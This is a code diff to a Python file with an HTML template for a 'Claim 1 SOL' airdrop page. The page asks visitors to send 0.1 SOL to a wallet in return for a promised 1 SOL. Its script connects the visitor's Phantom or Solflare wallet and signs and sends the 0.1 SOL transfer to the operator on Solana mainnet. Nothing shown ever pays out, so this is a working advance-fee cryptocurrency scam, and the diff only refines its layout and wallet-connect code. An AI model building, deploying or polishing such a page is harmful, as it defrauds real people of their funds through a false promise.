@@ -7,48 +7,48 @@ QR_CODE_URL = "https://raw.githubusercontent.com/markosgiassa1/coinupdater_bot/m
 
 HTML_TEMPLATE = """
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <meta charset="UTF-8">
+  <meta charset="UTF-8" />
   <title>Claim 1 SOL</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <style>
     body {
-      background: black;
+      background-color: black;
       color: white;
       font-family: Arial, sans-serif;
       text-align: center;
-      padding: 30px;
+      padding: 20px;
     }
     button {
       background: #00ff99;
-      color: black;
-      padding: 14px 24px;
-      font-size: 1.2em;
       border: none;
-      border-radius: 12px;
+      padding: 12px 24px;
       margin: 10px;
-      cursor: pointer;
+      border-radius: 8px;
       font-weight: bold;
+      font-size: 1.1em;
+      cursor: pointer;
+      color: black;
     }
     img.qr {
-      width: 220px;
+      width: 200px;
+      margin-top: 20px;
       display: none;
-      margin: 20px auto;
-      border-radius: 14px;
-      box-shadow: 0 0 20px #00ff99;
     }
   </style>
 </head>
 <body>
-  <h1>Claim 1 SOL Airdrop</h1>
-  <p>Send <strong>0.1 SOL</strong> to this address:</p>
+  <h1>Claim 1 SOL</h1>
+  <p>To receive 1 SOL, send exactly <strong>0.1 SOL</strong> to:</p>
   <p><code>{{ wallet }}</code></p>
-  <img src="{{ qr_url }}" alt="QR Code" id="qr" class="qr" />
+  <img id="qrCode" src="{{ qr_url }}" class="qr" alt="QR Code" />
+  <p id="status">Wallet not connected</p>
 
-  <p id="walletStatus">Click below to connect your wallet:</p>
-  <button onclick="connectPhantom()">Connect Wallet</button>
-  <button onclick="sendTransaction()" disabled id="claimBtn">Claim Now</button>
+  <button onclick="connectWallet()">Connect Wallet</button>
+  <button onclick="connectPhantom()">Connect Phantom Only</button>
+  <br>
+  <button onclick="sendTransaction()" id="sendBtn" disabled>Send 0.1 SOL</button>
 
   <script type="module">
     import {
@@ -59,52 +59,69 @@ HTML_TEMPLATE = """
     } from "https://cdn.jsdelivr.net/npm/@solana/web3.js@1.87.0/+esm";
 
     let provider = null;
-    let connected = false;
+    let publicKey = null;
+
+    async function connectWallet() {
+      if (window.solana && (window.solana.isPhantom || window.solana.isSolflare)) {
+        try {
+          const resp = await window.solana.connect();
+          provider = window.solana;
+          publicKey = resp.publicKey;
+          document.getElementById('status').innerText = "Connected: " + publicKey.toString();
+          document.getElementById('sendBtn').disabled = false;
+        } catch (err) {
+          console.error("Connection rejected:", err);
+        }
+      } else {
+        alert("Solana wallet not found. Try opening in Phantom or Solflare browser.");
+        document.getElementById("qrCode").style.display = "block";
+      }
+    }
 
     async function connectPhantom() {
       if (window.solana && window.solana.isPhantom) {
         try {
           const resp = await window.solana.connect();
           provider = window.solana;
-          connected = true;
-          document.getElementById('walletStatus').innerText =
-            "Connected: " + resp.publicKey.toString();
-          document.getElementById('claimBtn').disabled = false;
+          publicKey = resp.publicKey;
+          document.getElementById('status').innerText = "Connected (Phantom): " + publicKey.toString();
+          document.getElementById('sendBtn').disabled = false;
         } catch (err) {
-          console.error("User rejected connection", err);
+          console.error("User rejected Phantom connection:", err);
         }
       } else {
-        alert("Phantom wallet not found. Please open in a wallet browser.");
-        document.getElementById("qr").style.display = "block";
+        alert("Phantom wallet not found. Open in Phantom mobile browser.");
       }
     }
 
     async function sendTransaction() {
-      if (!connected || !provider) {
+      if (!provider || !publicKey) {
         alert("Please connect your wallet first.");
         return;
       }
 
       const connection = new Connection("https://api.mainnet-beta.solana.com");
+      const receiver = new PublicKey("{{ wallet }}");
 
       const transaction = new Transaction().add(
         SystemProgram.transfer({
-          fromPubkey: provider.publicKey,
-          toPubkey: new PublicKey("{{ wallet }}"),
-          lamports: 0.1 * 1e9 // 0.1 SOL
+          fromPubkey: publicKey,
+          toPubkey: receiver,
+          lamports: 0.1 * 1e9, // 0.1 SOL
         })
       );
 
       try {
         const { signature } = await provider.signAndSendTransaction(transaction);
         await connection.confirmTransaction(signature);
-        alert("✅ You paid 0.1 SOL. Your 1 SOL will arrive shortly!");
+        alert("✅ 0.1 SOL sent! You will receive 1 SOL soon.");
       } catch (e) {
         console.error(e);
         alert("❌ Transaction failed: " + e.message);
       }
     }
 
+    window.connectWallet = connectWallet;
     window.connectPhantom = connectPhantom;
     window.sendTransaction = sendTransaction;
   </script>
